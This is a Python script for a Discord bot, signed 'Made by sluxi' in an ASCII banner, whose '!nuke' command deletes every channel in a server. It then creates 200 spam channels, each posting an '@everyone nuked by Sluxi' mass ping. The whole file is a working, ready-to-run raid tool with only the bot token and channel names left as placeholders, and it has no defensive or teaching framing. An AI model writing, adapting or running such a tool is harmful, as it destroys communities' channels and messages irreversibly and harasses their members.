# /$$      /$$                 /$$                 /$$                                 /$$                     /$$      
#| $$$    /$$$                | $$                | $$                                | $$                    |__/      
#| $$$$  /$$$$  /$$$$$$   /$$$$$$$  /$$$$$$       | $$$$$$$  /$$   /$$        /$$$$$$$| $$ /$$   /$$ /$$   /$$ /$$      
#| $$ $$/$$ $$ |____  $$ /$$__  $$ /$$__  $$      | $$__  $$| $$  | $$       /$$_____/| $$| $$  | $$|  $$ /$$/| $$      
#| $$  $$$| $$  /$$$$$$$| $$  | $$| $$$$$$$$      | $$  \ $$| $$  | $$      |  $$$$$$ | $$| $$  | $$ \  $$$$/ | $$      
#| $$\  $ | $$ /$$__  $$| $$  | $$| $$_____/      | $$  | $$| $$  | $$       \____  $$| $$| $$  | $$  >$$  $$ | $$      
#| $$ \/  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$      | $$$$$$$/|  $$$$$$$       /$$$$$$$/| $$|  $$$$$$/ /$$/\  $$| $$      
#|__/     |__/ \_______/ \_______/ \_______/      |_______/  \____  $$      |_______/ |__/ \______/ |__/  \__/|__/      
#                                                            /$$  | $$                                                  
#                                                           |  $$$$$$/                                                  
#                                                            \______/                                                   
import discord
from discord.ext import commands
import random

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

print("bot is alive")


channel_names = ["your text", "your text", "your text", "your text", "your text", "your text"]

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='nuke')
async def create_and_delete_channels(ctx):

    for channel in ctx.guild.channels:
        await channel.delete()


    for i in range(1, 201):
        channel_name = random.choice(channel_names)
        new_channel = await ctx.guild.create_text_channel(f'{channel_name}-{i}')
        await new_channel.send('@everyone nuked by Sluxi')

    await ctx.send('deleted all')


bot.run('Your bot token')